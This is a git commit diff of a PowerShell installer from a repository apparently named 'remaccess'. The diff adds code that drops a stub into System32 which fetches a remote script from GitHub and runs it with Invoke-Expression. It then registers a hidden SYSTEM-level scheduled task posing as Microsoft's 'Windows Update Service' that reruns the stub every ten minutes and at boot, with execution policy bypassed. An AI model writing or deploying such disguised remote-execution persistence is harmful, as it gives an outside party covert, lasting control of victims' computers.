f35d2e7e3a284c446b8ee530a6e7c394f634afc9
沐宸 <62504289+DirNotAvailable@users.noreply.github.com>
2023-10-15 10:56:58 +0500

    Revamped the logic

--- TaskSchedulerServiceCreater.ps1
+++ TaskSchedulerServiceCreater.ps1
@@ -1,30 +1,24 @@
-# Prompt the user for the values
-$code = Read-Host "Enter the code"
-# Define the registry path
 $regPath = "HKLM:\Software\WindowsUpdateService"
+$code = Read-Host "Enter the code"
+$shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
+#Install Registry Entry
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force
 }
-#Install Daemon Service
-$scriptContent = @'
-$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/access-control"
-$localFilePath = "C:\Windows\WindowsUpdateService.ps1"
-$response = Invoke-WebRequest -Uri $url
-if ($response.StatusCode -eq 200) {
-    $response.Content | Set-Content -Path $localFilePath -Force
-} else {}
-'@
-$targetFilePath = "C:\Windows\WindowsUpdateServiceDaemon.ps1"
-Remove-Item $targetFilePath -Force -ErrorAction SilentlyContinue
-$scriptContent | Set-Content -Path $targetFilePath -Force
-# Set the values in the Registry
 Set-ItemProperty -Path $regPath -Name "Code" -Value $code
 Set-ItemProperty -Path $regPath -Name "Data" -Value active
-$url = "https://github.com/DirNotAvailable/remaccess/raw/main/access-control"
-$outputPath = "C:\Windows\WindowsUpdateService.ps1"
-Remove-Item $outputPath -Force -ErrorAction SilentlyContinue
-# Download the content from the URL and save it to the specified file
-Invoke-WebRequest -Uri $url -OutFile $outputPath
+#Install WindowsUpdateService
+$scriptContent = @'
+$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
+$response = Invoke-WebRequest -Uri $url -UseBasicParsing
+if ($response.StatusCode -eq 200) {
+    $scriptContent = $response.Content
+    Invoke-Expression $scriptContent
+} else {}
+'@
+Remove-Item $shellscriptpath -Force -ErrorAction SilentlyContinue
+$scriptContent | Set-Content -Path $targetFilePath -Force
+#Install Windows Service
 $updateservxml = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -35,82 +29,31 @@ $updateservxml = @"
     <URI>\Windows Update Service</URI>
   </RegistrationInfo>
   <Triggers>
+    <RegistrationTrigger>
+      <Repetition>
+        <Interval>PT10M</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <Enabled>true</Enabled>
+      <Delay>PT5M</Delay>
+    </RegistrationTrigger>
     <BootTrigger>
       <Repetition>
-        <Interval>PT1H</Interval>
+        <Interval>PT10M</Interval>
         <StopAtDurationEnd>false</StopAtDurationEnd>
       </Repetition>
       <Enabled>true</Enabled>
       <Delay>PT15M</Delay>
     </BootTrigger>
     <EventTrigger>
-      <Enabled>true</Enabled>
-      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
-    </EventTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>S-1-5-18</UserId>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>true</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
-    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
-      <Arguments>C:/Windows/WindowsUpdateService.ps1</Arguments>
-    </Exec>
-  </Actions>
-</Task>
-"@
-# Register the task from the XML content
-$updateserv = "Windows Update Service"
-if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
-    # Task exists, so delete it
-    Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
-    Write-Host "Task '$updateserv' deleted."
-} else {}
-Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv
-Start-ScheduledTask -TaskName $updateserv
-#Task Creation for Daemon Service
-$daemonxml = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Date>2023-10-13T20:52:57.307232</Date>
-    <Author>System\User</Author>
-    <Description>Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment.</Description>
-    <URI>\Windows Update Service Daemon</URI>
-  </RegistrationInfo>
-  <Triggers>
-    <BootTrigger>
       <Repetition>
-        <Interval>PT18M</Interval>
+        <Interval>PT10M</Interval>
         <StopAtDurationEnd>false</StopAtDurationEnd>
       </Repetition>
       <Enabled>true</Enabled>
-      <Delay>PT8M</Delay>
-    </BootTrigger>
+      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
+      <Delay>PT1M</Delay>
+    </EventTrigger>
   </Triggers>
   <Principals>
     <Principal id="Author">
@@ -122,7 +65,7 @@ $daemonxml = @"
     <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
+    <AllowHardTerminate>false</AllowHardTerminate>
     <StartWhenAvailable>true</StartWhenAvailable>
     <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
     <IdleSettings>
@@ -139,23 +82,43 @@ $daemonxml = @"
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
     <Priority>7</Priority>
     <RestartOnFailure>
-      <Interval>PT17M</Interval>
-      <Count>999</Count>
+      <Interval>PT10M</Interval>
+      <Count>10</Count>
     </RestartOnFailure>
   </Settings>
   <Actions Context="Author">
     <Exec>
       <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
-      <Arguments>C:/Windows/WindowsUpdateServiceDaemon.ps1</Arguments>
+      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsUpdateService.ps1"</Arguments>
+      <WorkingDirectory>C:\Windows\System32</WorkingDirectory>
     </Exec>
   </Actions>
 </Task>
 "@
+# Register the task from the XML content
+$updateserv = "Windows Update Service"
+if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
+    # Task exists, so delete it
+    Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
+    Write-Host "Task '$updateserv' deleted."
+} else {}
+Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv
+Start-ScheduledTask -TaskName $updateserv
+
+#Temporary secion for remoaval of rudimentroy file and tasks
 $daemonserv = "Windows Update Service Daemon"
 if (Get-ScheduledTask -TaskName $daemonserv -ErrorAction SilentlyContinue) {
     # Task exists, so delete it
     Unregister-ScheduledTask -TaskName $daemonserv -Confirm:$false
     Write-Host "Task '$daemonserv' deleted."
 } else {}
-Register-ScheduledTask -Xml $daemonxml -TaskName $daemonserv
-Start-ScheduledTask -TaskName $daemonserv
+# Removal of directories
+$ps1Files = @("C:\Windows\WindowsUpdateService.ps1", "C:\Windows\WindowsUpdateServiceDaemon.ps1")
+foreach ($file in $ps1Files) {
+    if (Test-Path $file -PathType Leaf) {
+        Remove-Item -Path $file -Force
+        Write-Host "File $file removed."
+    } else {
+        Write-Host "File $file does not exist."
+    }
+}
